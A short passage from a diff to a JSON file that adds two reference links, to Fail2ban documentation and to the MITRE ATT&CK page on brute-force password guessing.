+			"title": "Fail2ban Documentation",
+			"url": "https://www.fail2ban.org/wiki/index.php/Main_Page"
+		},
+		{
+			"title": "MITRE ATT&CK - Brute Force: Password Guessing (T1110.001)",
+			"url": "https://attack.mitre.org/techniques/T1110/001/"
+		}
+	]
+}
